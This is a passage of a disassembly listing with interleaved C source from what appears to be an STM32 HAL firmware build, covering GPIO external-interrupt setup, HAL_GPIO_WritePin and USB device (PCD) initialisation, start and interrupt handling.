 8001c6c:	4a4d      	ldr	r2, [pc, #308]	; (8001da4 <HAL_GPIO_Init+0x2c4>)
 8001c6e:	697b      	ldr	r3, [r7, #20]
 8001c70:	089b      	lsrs	r3, r3, #2
 8001c72:	3302      	adds	r3, #2
 8001c74:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001c78:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001c7a:	697b      	ldr	r3, [r7, #20]
 8001c7c:	f003 0303 	and.w	r3, r3, #3
 8001c80:	009b      	lsls	r3, r3, #2
 8001c82:	220f      	movs	r2, #15
 8001c84:	fa02 f303 	lsl.w	r3, r2, r3
 8001c88:	43db      	mvns	r3, r3
 8001c8a:	693a      	ldr	r2, [r7, #16]
 8001c8c:	4013      	ands	r3, r2
 8001c8e:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001c90:	687b      	ldr	r3, [r7, #4]
 8001c92:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001c96:	d00d      	beq.n	8001cb4 <HAL_GPIO_Init+0x1d4>
 8001c98:	687b      	ldr	r3, [r7, #4]
 8001c9a:	4a43      	ldr	r2, [pc, #268]	; (8001da8 <HAL_GPIO_Init+0x2c8>)
 8001c9c:	4293      	cmp	r3, r2
 8001c9e:	d007      	beq.n	8001cb0 <HAL_GPIO_Init+0x1d0>
 8001ca0:	687b      	ldr	r3, [r7, #4]
 8001ca2:	4a42      	ldr	r2, [pc, #264]	; (8001dac <HAL_GPIO_Init+0x2cc>)
 8001ca4:	4293      	cmp	r3, r2
 8001ca6:	d101      	bne.n	8001cac <HAL_GPIO_Init+0x1cc>
 8001ca8:	2302      	movs	r3, #2
 8001caa:	e004      	b.n	8001cb6 <HAL_GPIO_Init+0x1d6>
 8001cac:	2307      	movs	r3, #7
 8001cae:	e002      	b.n	8001cb6 <HAL_GPIO_Init+0x1d6>
 8001cb0:	2301      	movs	r3, #1
 8001cb2:	e000      	b.n	8001cb6 <HAL_GPIO_Init+0x1d6>
 8001cb4:	2300      	movs	r3, #0
 8001cb6:	697a      	ldr	r2, [r7, #20]
 8001cb8:	f002 0203 	and.w	r2, r2, #3
 8001cbc:	0092      	lsls	r2, r2, #2
 8001cbe:	4093      	lsls	r3, r2
 8001cc0:	693a      	ldr	r2, [r7, #16]
 8001cc2:	4313      	orrs	r3, r2
 8001cc4:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001cc6:	4937      	ldr	r1, [pc, #220]	; (8001da4 <HAL_GPIO_Init+0x2c4>)
 8001cc8:	697b      	ldr	r3, [r7, #20]
 8001cca:	089b      	lsrs	r3, r3, #2
 8001ccc:	3302      	adds	r3, #2
 8001cce:	693a      	ldr	r2, [r7, #16]
 8001cd0:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001cd4:	4b36      	ldr	r3, [pc, #216]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001cd6:	689b      	ldr	r3, [r3, #8]
 8001cd8:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001cda:	68fb      	ldr	r3, [r7, #12]
 8001cdc:	43db      	mvns	r3, r3
 8001cde:	693a      	ldr	r2, [r7, #16]
 8001ce0:	4013      	ands	r3, r2
 8001ce2:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001ce4:	683b      	ldr	r3, [r7, #0]
 8001ce6:	685b      	ldr	r3, [r3, #4]
 8001ce8:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001cec:	2b00      	cmp	r3, #0
 8001cee:	d003      	beq.n	8001cf8 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001cf0:	693a      	ldr	r2, [r7, #16]
 8001cf2:	68fb      	ldr	r3, [r7, #12]
 8001cf4:	4313      	orrs	r3, r2
 8001cf6:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001cf8:	4a2d      	ldr	r2, [pc, #180]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001cfa:	693b      	ldr	r3, [r7, #16]
 8001cfc:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001cfe:	4b2c      	ldr	r3, [pc, #176]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001d00:	68db      	ldr	r3, [r3, #12]
 8001d02:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d04:	68fb      	ldr	r3, [r7, #12]
 8001d06:	43db      	mvns	r3, r3
 8001d08:	693a      	ldr	r2, [r7, #16]
 8001d0a:	4013      	ands	r3, r2
 8001d0c:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001d0e:	683b      	ldr	r3, [r7, #0]
 8001d10:	685b      	ldr	r3, [r3, #4]
 8001d12:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001d16:	2b00      	cmp	r3, #0
 8001d18:	d003      	beq.n	8001d22 <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001d1a:	693a      	ldr	r2, [r7, #16]
 8001d1c:	68fb      	ldr	r3, [r7, #12]
 8001d1e:	4313      	orrs	r3, r2
 8001d20:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001d22:	4a23      	ldr	r2, [pc, #140]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001d24:	693b      	ldr	r3, [r7, #16]
 8001d26:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001d28:	4b21      	ldr	r3, [pc, #132]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001d2a:	685b      	ldr	r3, [r3, #4]
 8001d2c:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d2e:	68fb      	ldr	r3, [r7, #12]
 8001d30:	43db      	mvns	r3, r3
 8001d32:	693a      	ldr	r2, [r7, #16]
 8001d34:	4013      	ands	r3, r2
 8001d36:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001d38:	683b      	ldr	r3, [r7, #0]
 8001d3a:	685b      	ldr	r3, [r3, #4]
 8001d3c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001d40:	2b00      	cmp	r3, #0
 8001d42:	d003      	beq.n	8001d4c <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001d44:	693a      	ldr	r2, [r7, #16]
 8001d46:	68fb      	ldr	r3, [r7, #12]
 8001d48:	4313      	orrs	r3, r2
 8001d4a:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001d4c:	4a18      	ldr	r2, [pc, #96]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001d4e:	693b      	ldr	r3, [r7, #16]
 8001d50:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001d52:	4b17      	ldr	r3, [pc, #92]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001d54:	681b      	ldr	r3, [r3, #0]
 8001d56:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d58:	68fb      	ldr	r3, [r7, #12]
 8001d5a:	43db      	mvns	r3, r3
 8001d5c:	693a      	ldr	r2, [r7, #16]
 8001d5e:	4013      	ands	r3, r2
 8001d60:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001d62:	683b      	ldr	r3, [r7, #0]
 8001d64:	685b      	ldr	r3, [r3, #4]
 8001d66:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001d6a:	2b00      	cmp	r3, #0
 8001d6c:	d003      	beq.n	8001d76 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001d6e:	693a      	ldr	r2, [r7, #16]
 8001d70:	68fb      	ldr	r3, [r7, #12]
 8001d72:	4313      	orrs	r3, r2
 8001d74:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001d76:	4a0e      	ldr	r2, [pc, #56]	; (8001db0 <HAL_GPIO_Init+0x2d0>)
 8001d78:	693b      	ldr	r3, [r7, #16]
 8001d7a:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001d7c:	697b      	ldr	r3, [r7, #20]
 8001d7e:	3301      	adds	r3, #1
 8001d80:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001d82:	683b      	ldr	r3, [r7, #0]
 8001d84:	681a      	ldr	r2, [r3, #0]
 8001d86:	697b      	ldr	r3, [r7, #20]
 8001d88:	fa22 f303 	lsr.w	r3, r2, r3
 8001d8c:	2b00      	cmp	r3, #0
 8001d8e:	f47f aeaf 	bne.w	8001af0 <HAL_GPIO_Init+0x10>
  }
}
 8001d92:	bf00      	nop
 8001d94:	bf00      	nop
 8001d96:	371c      	adds	r7, #28
 8001d98:	46bd      	mov	sp, r7
 8001d9a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001d9e:	4770      	bx	lr
 8001da0:	40021000 	.word	0x40021000
 8001da4:	40010000 	.word	0x40010000
 8001da8:	48000400 	.word	0x48000400
 8001dac:	48000800 	.word	0x48000800
 8001db0:	40010400 	.word	0x40010400

08001db4 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001db4:	b480      	push	{r7}
 8001db6:	b083      	sub	sp, #12
 8001db8:	af00      	add	r7, sp, #0
 8001dba:	6078      	str	r0, [r7, #4]
 8001dbc:	460b      	mov	r3, r1
 8001dbe:	807b      	strh	r3, [r7, #2]
 8001dc0:	4613      	mov	r3, r2
 8001dc2:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001dc4:	787b      	ldrb	r3, [r7, #1]
 8001dc6:	2b00      	cmp	r3, #0
 8001dc8:	d003      	beq.n	8001dd2 <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001dca:	887a      	ldrh	r2, [r7, #2]
 8001dcc:	687b      	ldr	r3, [r7, #4]
 8001dce:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001dd0:	e002      	b.n	8001dd8 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001dd2:	887a      	ldrh	r2, [r7, #2]
 8001dd4:	687b      	ldr	r3, [r7, #4]
 8001dd6:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001dd8:	bf00      	nop
 8001dda:	370c      	adds	r7, #12
 8001ddc:	46bd      	mov	sp, r7
 8001dde:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001de2:	4770      	bx	lr

08001de4 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001de4:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001de6:	b08b      	sub	sp, #44	; 0x2c
 8001de8:	af06      	add	r7, sp, #24
 8001dea:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001dec:	687b      	ldr	r3, [r7, #4]
 8001dee:	2b00      	cmp	r3, #0
 8001df0:	d101      	bne.n	8001df6 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001df2:	2301      	movs	r3, #1
 8001df4:	e0f8      	b.n	8001fe8 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001df6:	687b      	ldr	r3, [r7, #4]
 8001df8:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001dfc:	b2db      	uxtb	r3, r3
 8001dfe:	2b00      	cmp	r3, #0
 8001e00:	d106      	bne.n	8001e10 <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001e02:	687b      	ldr	r3, [r7, #4]
 8001e04:	2200      	movs	r2, #0
 8001e06:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001e0a:	6878      	ldr	r0, [r7, #4]
 8001e0c:	f00a fde4 	bl	800c9d8 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001e10:	687b      	ldr	r3, [r7, #4]
 8001e12:	2203      	movs	r2, #3
 8001e14:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001e18:	687b      	ldr	r3, [r7, #4]
 8001e1a:	681b      	ldr	r3, [r3, #0]
 8001e1c:	4618      	mov	r0, r3
 8001e1e:	f004 f8d4 	bl	8005fca <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001e22:	687b      	ldr	r3, [r7, #4]
 8001e24:	681b      	ldr	r3, [r3, #0]
 8001e26:	603b      	str	r3, [r7, #0]
 8001e28:	687e      	ldr	r6, [r7, #4]
 8001e2a:	466d      	mov	r5, sp
 8001e2c:	f106 0410 	add.w	r4, r6, #16
 8001e30:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001e32:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001e34:	6823      	ldr	r3, [r4, #0]
 8001e36:	602b      	str	r3, [r5, #0]
 8001e38:	1d33      	adds	r3, r6, #4
 8001e3a:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001e3c:	6838      	ldr	r0, [r7, #0]
 8001e3e:	f004 f89c 	bl	8005f7a <USB_CoreInit>
 8001e42:	4603      	mov	r3, r0
 8001e44:	2b00      	cmp	r3, #0
 8001e46:	d005      	beq.n	8001e54 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001e48:	687b      	ldr	r3, [r7, #4]
 8001e4a:	2202      	movs	r2, #2
 8001e4c:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001e50:	2301      	movs	r3, #1
 8001e52:	e0c9      	b.n	8001fe8 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001e54:	687b      	ldr	r3, [r7, #4]
 8001e56:	681b      	ldr	r3, [r3, #0]
 8001e58:	2100      	movs	r1, #0
 8001e5a:	4618      	mov	r0, r3
 8001e5c:	f004 f8d0 	bl	8006000 <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001e60:	2300      	movs	r3, #0
 8001e62:	73fb      	strb	r3, [r7, #15]
 8001e64:	e040      	b.n	8001ee8 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001e66:	7bfb      	ldrb	r3, [r7, #15]
 8001e68:	6879      	ldr	r1, [r7, #4]
 8001e6a:	1c5a      	adds	r2, r3, #1
 8001e6c:	4613      	mov	r3, r2
 8001e6e:	009b      	lsls	r3, r3, #2
 8001e70:	4413      	add	r3, r2
 8001e72:	00db      	lsls	r3, r3, #3
 8001e74:	440b      	add	r3, r1
 8001e76:	3301      	adds	r3, #1
 8001e78:	2201      	movs	r2, #1
 8001e7a:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001e7c:	7bfb      	ldrb	r3, [r7, #15]
 8001e7e:	6879      	ldr	r1, [r7, #4]
 8001e80:	1c5a      	adds	r2, r3, #1
 8001e82:	4613      	mov	r3, r2
 8001e84:	009b      	lsls	r3, r3, #2
 8001e86:	4413      	add	r3, r2
 8001e88:	00db      	lsls	r3, r3, #3
 8001e8a:	440b      	add	r3, r1
 8001e8c:	7bfa      	ldrb	r2, [r7, #15]
 8001e8e:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001e90:	7bfb      	ldrb	r3, [r7, #15]
 8001e92:	6879      	ldr	r1, [r7, #4]
 8001e94:	1c5a      	adds	r2, r3, #1
 8001e96:	4613      	mov	r3, r2
 8001e98:	009b      	lsls	r3, r3, #2
 8001e9a:	4413      	add	r3, r2
 8001e9c:	00db      	lsls	r3, r3, #3
 8001e9e:	440b      	add	r3, r1
 8001ea0:	3303      	adds	r3, #3
 8001ea2:	2200      	movs	r2, #0
 8001ea4:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001ea6:	7bfa      	ldrb	r2, [r7, #15]
 8001ea8:	6879      	ldr	r1, [r7, #4]
 8001eaa:	4613      	mov	r3, r2
 8001eac:	009b      	lsls	r3, r3, #2
 8001eae:	4413      	add	r3, r2
 8001eb0:	00db      	lsls	r3, r3, #3
 8001eb2:	440b      	add	r3, r1
 8001eb4:	3338      	adds	r3, #56	; 0x38
 8001eb6:	2200      	movs	r2, #0
 8001eb8:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001eba:	7bfa      	ldrb	r2, [r7, #15]
 8001ebc:	6879      	ldr	r1, [r7, #4]
 8001ebe:	4613      	mov	r3, r2
 8001ec0:	009b      	lsls	r3, r3, #2
 8001ec2:	4413      	add	r3, r2
 8001ec4:	00db      	lsls	r3, r3, #3
 8001ec6:	440b      	add	r3, r1
 8001ec8:	333c      	adds	r3, #60	; 0x3c
 8001eca:	2200      	movs	r2, #0
 8001ecc:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001ece:	7bfa      	ldrb	r2, [r7, #15]
 8001ed0:	6879      	ldr	r1, [r7, #4]
 8001ed2:	4613      	mov	r3, r2
 8001ed4:	009b      	lsls	r3, r3, #2
 8001ed6:	4413      	add	r3, r2
 8001ed8:	00db      	lsls	r3, r3, #3
 8001eda:	440b      	add	r3, r1
 8001edc:	3340      	adds	r3, #64	; 0x40
 8001ede:	2200      	movs	r2, #0
 8001ee0:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001ee2:	7bfb      	ldrb	r3, [r7, #15]
 8001ee4:	3301      	adds	r3, #1
 8001ee6:	73fb      	strb	r3, [r7, #15]
 8001ee8:	7bfa      	ldrb	r2, [r7, #15]
 8001eea:	687b      	ldr	r3, [r7, #4]
 8001eec:	685b      	ldr	r3, [r3, #4]
 8001eee:	429a      	cmp	r2, r3
 8001ef0:	d3b9      	bcc.n	8001e66 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001ef2:	2300      	movs	r3, #0
 8001ef4:	73fb      	strb	r3, [r7, #15]
 8001ef6:	e044      	b.n	8001f82 <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001ef8:	7bfa      	ldrb	r2, [r7, #15]
 8001efa:	6879      	ldr	r1, [r7, #4]
 8001efc:	4613      	mov	r3, r2
 8001efe:	009b      	lsls	r3, r3, #2
 8001f00:	4413      	add	r3, r2
 8001f02:	00db      	lsls	r3, r3, #3
 8001f04:	440b      	add	r3, r1
 8001f06:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001f0a:	2200      	movs	r2, #0
 8001f0c:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001f0e:	7bfa      	ldrb	r2, [r7, #15]
 8001f10:	6879      	ldr	r1, [r7, #4]
 8001f12:	4613      	mov	r3, r2
 8001f14:	009b      	lsls	r3, r3, #2
 8001f16:	4413      	add	r3, r2
 8001f18:	00db      	lsls	r3, r3, #3
 8001f1a:	440b      	add	r3, r1
 8001f1c:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001f20:	7bfa      	ldrb	r2, [r7, #15]
 8001f22:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001f24:	7bfa      	ldrb	r2, [r7, #15]
 8001f26:	6879      	ldr	r1, [r7, #4]
 8001f28:	4613      	mov	r3, r2
 8001f2a:	009b      	lsls	r3, r3, #2
 8001f2c:	4413      	add	r3, r2
 8001f2e:	00db      	lsls	r3, r3, #3
 8001f30:	440b      	add	r3, r1
 8001f32:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001f36:	2200      	movs	r2, #0
 8001f38:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001f3a:	7bfa      	ldrb	r2, [r7, #15]
 8001f3c:	6879      	ldr	r1, [r7, #4]
 8001f3e:	4613      	mov	r3, r2
 8001f40:	009b      	lsls	r3, r3, #2
 8001f42:	4413      	add	r3, r2
 8001f44:	00db      	lsls	r3, r3, #3
 8001f46:	440b      	add	r3, r1
 8001f48:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001f4c:	2200      	movs	r2, #0
 8001f4e:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001f50:	7bfa      	ldrb	r2, [r7, #15]
 8001f52:	6879      	ldr	r1, [r7, #4]
 8001f54:	4613      	mov	r3, r2
 8001f56:	009b      	lsls	r3, r3, #2
 8001f58:	4413      	add	r3, r2
 8001f5a:	00db      	lsls	r3, r3, #3
 8001f5c:	440b      	add	r3, r1
 8001f5e:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001f62:	2200      	movs	r2, #0
 8001f64:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001f66:	7bfa      	ldrb	r2, [r7, #15]
 8001f68:	6879      	ldr	r1, [r7, #4]
 8001f6a:	4613      	mov	r3, r2
 8001f6c:	009b      	lsls	r3, r3, #2
 8001f6e:	4413      	add	r3, r2
 8001f70:	00db      	lsls	r3, r3, #3
 8001f72:	440b      	add	r3, r1
 8001f74:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001f78:	2200      	movs	r2, #0
 8001f7a:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001f7c:	7bfb      	ldrb	r3, [r7, #15]
 8001f7e:	3301      	adds	r3, #1
 8001f80:	73fb      	strb	r3, [r7, #15]
 8001f82:	7bfa      	ldrb	r2, [r7, #15]
 8001f84:	687b      	ldr	r3, [r7, #4]
 8001f86:	685b      	ldr	r3, [r3, #4]
 8001f88:	429a      	cmp	r2, r3
 8001f8a:	d3b5      	bcc.n	8001ef8 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001f8c:	687b      	ldr	r3, [r7, #4]
 8001f8e:	681b      	ldr	r3, [r3, #0]
 8001f90:	603b      	str	r3, [r7, #0]
 8001f92:	687e      	ldr	r6, [r7, #4]
 8001f94:	466d      	mov	r5, sp
 8001f96:	f106 0410 	add.w	r4, r6, #16
 8001f9a:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001f9c:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001f9e:	6823      	ldr	r3, [r4, #0]
 8001fa0:	602b      	str	r3, [r5, #0]
 8001fa2:	1d33      	adds	r3, r6, #4
 8001fa4:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001fa6:	6838      	ldr	r0, [r7, #0]
 8001fa8:	f004 f837 	bl	800601a <USB_DevInit>
 8001fac:	4603      	mov	r3, r0
 8001fae:	2b00      	cmp	r3, #0
 8001fb0:	d005      	beq.n	8001fbe <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001fb2:	687b      	ldr	r3, [r7, #4]
 8001fb4:	2202      	movs	r2, #2
 8001fb6:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001fba:	2301      	movs	r3, #1
 8001fbc:	e014      	b.n	8001fe8 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001fbe:	687b      	ldr	r3, [r7, #4]
 8001fc0:	2200      	movs	r2, #0
 8001fc2:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001fc6:	687b      	ldr	r3, [r7, #4]
 8001fc8:	2201      	movs	r2, #1
 8001fca:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001fce:	687b      	ldr	r3, [r7, #4]
 8001fd0:	69db      	ldr	r3, [r3, #28]
 8001fd2:	2b01      	cmp	r3, #1
 8001fd4:	d102      	bne.n	8001fdc <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001fd6:	6878      	ldr	r0, [r7, #4]
 8001fd8:	f001 fc9e 	bl	8003918 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001fdc:	687b      	ldr	r3, [r7, #4]
 8001fde:	681b      	ldr	r3, [r3, #0]
 8001fe0:	4618      	mov	r0, r3
 8001fe2:	f006 fadf 	bl	80085a4 <USB_DevDisconnect>

  return HAL_OK;
 8001fe6:	2300      	movs	r3, #0
}
 8001fe8:	4618      	mov	r0, r3
 8001fea:	3714      	adds	r7, #20
 8001fec:	46bd      	mov	sp, r7
 8001fee:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001ff0 <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001ff0:	b580      	push	{r7, lr}
 8001ff2:	b082      	sub	sp, #8
 8001ff4:	af00      	add	r7, sp, #0
 8001ff6:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001ff8:	687b      	ldr	r3, [r7, #4]
 8001ffa:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001ffe:	2b01      	cmp	r3, #1
 8002000:	d101      	bne.n	8002006 <HAL_PCD_Start+0x16>
 8002002:	2302      	movs	r3, #2
 8002004:	e012      	b.n	800202c <HAL_PCD_Start+0x3c>
 8002006:	687b      	ldr	r3, [r7, #4]
 8002008:	2201      	movs	r2, #1
 800200a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 800200e:	687b      	ldr	r3, [r7, #4]
 8002010:	681b      	ldr	r3, [r3, #0]
 8002012:	4618      	mov	r0, r3
 8002014:	f003 ffc2 	bl	8005f9c <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8002018:	687b      	ldr	r3, [r7, #4]
 800201a:	681b      	ldr	r3, [r3, #0]
 800201c:	4618      	mov	r0, r3
 800201e:	f006 faaa 	bl	8008576 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8002022:	687b      	ldr	r3, [r7, #4]
 8002024:	2200      	movs	r2, #0
 8002026:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800202a:	2300      	movs	r3, #0
}
 800202c:	4618      	mov	r0, r3
 800202e:	3708      	adds	r7, #8
 8002030:	46bd      	mov	sp, r7
 8002032:	bd80      	pop	{r7, pc}

08002034 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8002034:	b580      	push	{r7, lr}
 8002036:	b084      	sub	sp, #16
 8002038:	af00      	add	r7, sp, #0
 800203a:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 800203c:	687b      	ldr	r3, [r7, #4]
 800203e:	681b      	ldr	r3, [r3, #0]
 8002040:	4618      	mov	r0, r3
 8002042:	f006 fac4 	bl	80085ce <USB_ReadInterrupts>
 8002046:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8002048:	68fb      	ldr	r3, [r7, #12]
 800204a:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
